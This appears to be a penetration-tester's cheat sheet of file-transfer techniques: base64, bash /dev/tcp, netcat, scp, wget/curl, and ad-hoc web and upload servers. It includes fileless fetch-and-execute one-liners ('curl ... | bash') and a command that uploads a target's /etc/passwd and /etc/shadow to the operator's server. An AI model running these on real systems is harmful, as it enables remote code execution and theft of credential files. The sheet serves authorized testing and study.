Base64

Usage

Local

cat <targetfileName> | base64 -w 0; echo

sha256sum <targetFileName>

Remote

echo <base64> | base64 -d > <outputFileName>

sha256sum <outputFileName>

Bash

Usage

Connect to target web server :

exec 3<>/dev/tcp/<serverIP>/80

HTTP Get request :

echo -e "GET /<targetFileName> HTTP/1.1\n\n">&3

Print response :

cat <&3

Requirements

Packets

  • bash version 2.04 or greater

Netcat and Ncat

Usage

Listen on Remote (or local)

Remote

Netcat - listen on port 8000, redirect stdout to <outputFileName> :

nc -l -p 8000 > <outputFileName>

Ncat - parameter--recv-only to close connection once transfer is finished :

ncat -l -p 8000 --recv-only > <outputFileName>
Local

Send a file to listening host (-q 0 close connection once finished):

nc -q 0 <serverIP> 8000 < <targetFilePath>

With --send-only (terminate once input is exhausted, do not wait for a closed connection) :

nc --send-only <serverIP> 8000 < <targetFilePath>

Request on Remote (or local)

Local

Netcat :

sudo nc -l -p 443 -q 0 < <targetFilePath>

Ncat :

sudo ncat -l -p 443 --send-only < <targetFilePath>
Remote

Netcat :

nc <serverIP> 443 > <outputFileName>

Ncat :

ncat <serverIP> 443 --recv-only > <outputFileName>

With /dev/tcp :

cat < /dev/tcp/<serverIP>/443 > <outputFileName>

SSH and SCP

Usage

Download a file :

scp <user>@<serverIP>:<targetFilePath>

scp <user>@<serverIP>:<targetFilePath> <outputFileName>

Upload a file :

scp <targetFilePath> <user>@<serverIP>:<outputFilePath>

Setting up server (local)

Enabling SSH server :

sudo systemctl enable ssh

Starting SSH server :

sudo systemctl start ssh

Checking SSH listening port :

netstat -lnpt

Note : use a temporary account for file transfer to avoid using primary credentials / keys on target computer.

Web Transfers

Usage

Wget

wget <targetFileURL> -O <outputFileName>

Fileless :

wget -qO- <targetFileURL> | python3

Curl

curl <targetFileURL> -o <outputFileName>

Fileless :

curl <targetFileURL> | bash

Setting up server

Local

Python3 web server :

python3 -m http.server

Python2.7 web server :

python2.7 -m SimpleHTTPServer

PHP web server :

php -S 0.0.0.0:8000

Ruby web server :

ruby -run -ehttpd . -p8000

Remote

wget <serverIP>:8000/<targetFileName>

Web Uploads

Usage

HTTP

Local
python3 -m uploadserver
Remote
curl -X POST http://<serverIP>:8000/upload -F 'files=@<targetFilePath>'

HTTPS

Local

Create self-signed certificate :

openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Create a directory specific to the webserver and start it :

sudo python3 -m uploadserver 443 --server-certificate <serverCertificate>
Remote

Upload files /etc/passwd and /etc/shadow :

curl -X POST https://<serverIP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

Requirements

Python

  • uploadserver
